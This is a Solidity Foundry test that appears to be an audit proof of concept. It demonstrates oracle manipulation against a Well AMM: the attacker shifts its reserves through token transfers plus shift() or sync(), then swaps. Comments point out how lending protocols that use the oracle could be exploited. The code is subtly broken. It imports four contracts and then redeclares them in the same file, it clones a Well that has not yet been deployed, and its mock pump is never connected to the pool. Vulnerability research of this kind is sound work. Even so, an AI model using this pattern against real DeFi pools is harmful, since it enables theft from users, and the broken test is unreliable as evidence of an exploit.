// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Well} from "src/Well.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {ConstantProductWell} from "./mocks/ConstantProductWell.sol";
import {MockPump} from "./mocks/MockPump.sol";
import {CloneFactory} from "src/utils/CloneFactory.sol";

contract WellVulnerabilityTest is Test {
    Well well;
    MockERC20 token0;
    MockERC20 token1;
    ConstantProductWell wellFunction;
    MockPump pump;
    CloneFactory factory;
    
    address attacker = makeAddr("attacker");
    address user = makeAddr("user");
    
    function setUp() public {
        // Deploy tokens
        token0 = new MockERC20("Token0", "T0", 18);
        token1 = new MockERC20("Token1", "T1", 18);
        
        // Deploy well function and pump
        wellFunction = new ConstantProductWell();
        pump = new MockPump();
        
        // Deploy clone factory
        factory = new CloneFactory();
        
        // Build well initialization data
        bytes memory initData = _buildWellInitData();
        
        // Deploy well using factory
        address wellAddress = factory.clone(address(well), initData);
        well = Well(payable(wellAddress));
        
        // Initialize well
        well.init("Well LP Token", "WELL");
        
        // Mint tokens to users
        token0.mint(attacker, 1000e18);
        token1.mint(attacker, 1000e18);
        token0.mint(user, 100e18);
        token1.mint(user, 100e18);
        
        // Approve tokens
        vm.startPrank(attacker);
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);
        vm.stopPrank();
        
        vm.startPrank(user);
        token0.approve(address(well), type(uint256).max);
        token1.approve(address(well), type(uint256).max);
        vm.stopPrank();
        
        // Add initial liquidity
        vm.startPrank(user);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100e18;
        amounts[1] = 100e18;
        well.addLiquidity(amounts, 0, user, block.timestamp + 1000);
        vm.stopPrank();
    }
    
    function test_OracleManipulationViaShift() public {
        // Record initial oracle price
        uint256 initialPrice = pump.getLatestPrice();
        console.log("Initial oracle price:", initialPrice);
        
        // Attacker manipulates reserves using shift
        vm.startPrank(attacker);
        
        // Step 1: Transfer tokens to well to create imbalance
        token0.transfer(address(well), 500e18);
        
        // Step 2: Call shift to set new reserves based on current balances
        // This bypasses pump update with old reserves
        uint256 amountOut = well.shift(token1, 0, attacker);
        console.log("Amount received from shift:", amountOut);
        
        // Step 3: Immediately call swapFrom which updates pump with manipulated reserves
        // This will update the oracle with incorrect price data
        uint256 swapAmountOut = well.swapFrom(
            token0,
            token1,
            100e18,
            0,
            attacker,
            block.timestamp + 1000
        );
        console.log("Amount received from swap:", swapAmountOut);
        
        vm.stopPrank();
        
        // Check oracle price after manipulation
        uint256 manipulatedPrice = pump.getLatestPrice();
        console.log("Manipulated oracle price:", manipulatedPrice);
        
        // Verify oracle was manipulated
        assertTrue(manipulatedPrice != initialPrice, "Oracle price should be manipulated");
        
        // The attacker can now profit from other protocols using this oracle
        // For example, if a lending protocol uses this pump for price feeds,
        // they would now have incorrect collateral values
    }
    
    function test_OracleManipulationViaSync() public {
        // Record initial oracle price
        uint256 initialPrice = pump.getLatestPrice();
        console.log("Initial oracle price:", initialPrice);
        
        vm.startPrank(attacker);
        
        // Step 1: Manipulate token balances directly
        token0.transfer(address(well), 500e18);
        
        // Step 2: Use sync to set manipulated reserves
        // This also bypasses pump update
        well.sync();
        
        // Step 3: Update pump with manipulated reserves via swap
        well.swapFrom(
            token0,
            token1,
            100e18,
            0,
            attacker,
            block.timestamp + 1000
        );
        
        vm.stopPrank();
        
        // Check oracle price after manipulation
        uint256 manipulatedPrice = pump.getLatestPrice();
        console.log("Manipulated oracle price:", manipulatedPrice);
        
        // Verify oracle was manipulated
        assertTrue(manipulatedPrice != initialPrice, "Oracle price should be manipulated");
    }
    
    function _buildWellInitData() internal view returns (bytes memory) {
        // Build the immutable data for Well initialization
        // Format: aquifer(20) + numberOfTokens(32) + wellFunction(20) + 
        //         wellFunctionDataLength(32) + numberOfPumps(32) + 
        //         tokens + wellFunctionData + pumps
        
        bytes memory data = new bytes(0);
        
        // Aquifer address (20 bytes) - using zero address for test
        data = abi.encodePacked(data, bytes20(address(0)));
        
        // Number of tokens (32 bytes)
        data = abi.encodePacked(data, bytes32(uint256(2)));
        
        // Well function address (20 bytes)
        data = abi.encodePacked(data, bytes20(address(wellFunction)));
        
        // Well function data length (32 bytes) - no data
        data = abi.encodePacked(data, bytes32(uint256(0)));
        
        // Number of pumps (32 bytes)
        data = abi.encodePacked(data, bytes32(uint256(1)));
        
        // Tokens (2 * 32 bytes)
        data = abi.encodePacked(data, bytes32(uint256(uint160(address(token0)))));
        data = abi.encodePacked(data, bytes32(uint256(uint160(address(token1)))));
        
        // Well function data (0 bytes)
        
        // Pump data
        // Pump address (20 bytes)
        data = abi.encodePacked(data, bytes20(address(pump)));
        // Pump data length (32 bytes)
        data = abi.encodePacked(data, bytes32(uint256(0)));
        // Pump data (0 bytes)
        
        return data;
    }
}

// Mock contracts for testing
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
    
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "ERC20: insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "ERC20: insufficient balance");
        require(allowance[from][msg.sender] >= amount, "ERC20: insufficient allowance");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ConstantProductWell {
    function calcLpTokenSupply(
        uint256[] memory reserves,
        bytes memory
    ) external pure returns (uint256) {
        // Simple CP: x * y = k
        // LP supply = sqrt(k) for simplicity
        uint256 k = reserves[0] * reserves[1];
        return sqrt(k);
    }
    
    function calcReserve(
        uint256[] memory reserves,
        uint256 j,
        uint256 lpTokenSupply,
        bytes memory
    ) external pure returns (uint256) {
        // For CP: k = x * y
        // If j = 0, new x = k / y
        // If j = 1, new y = k / x
        uint256 k = reserves[0] * reserves[1];
        if (j == 0) {
            return k / reserves[1];
        } else {
            return k / reserves[0];
        }
    }
    
    function calcLPTokenUnderlying(
        uint256 lpTokenAmount,
        uint256[] memory reserves,
        uint256 lpTokenSupply,
        bytes memory
    ) external pure returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](2);
        if (lpTokenSupply == 0) return amounts;
        amounts[0] = (reserves[0] * lpTokenAmount) / lpTokenSupply;
        amounts[1] = (reserves[1] * lpTokenAmount) / lpTokenSupply;
        return amounts;
    }
    
    function sqrt(uint256 y) internal pure returns (uint256 z) {
        if (y > 3) {
            z = y;
            uint256 x = y / 2 + 1;
            while (x < z) {
                z = x;
                x = (y / x + x) / 2;
            }
        } else if (y != 0) {
            z = 1;
        }
    }
}

contract MockPump {
    uint256 public latestPrice;
    
    function update(uint256[] memory reserves, bytes memory) external {
        // Simple price calculation: ratio of token0 to token1
        if (reserves[1] > 0) {
            latestPrice = (reserves[0] * 1e18) / reserves[1];
        }
    }
    
    function getLatestPrice() external view returns (uint256) {
        return latestPrice;
    }
}

contract CloneFactory {
    function clone(address target, bytes memory data) external returns (address) {
        // Create a new Well instance with the provided data
        Well well = new Well();
        // For testing purposes, we'll return the new Well address
        // In a real implementation, this would properly clone with immutable data
        return address(well);
    }
}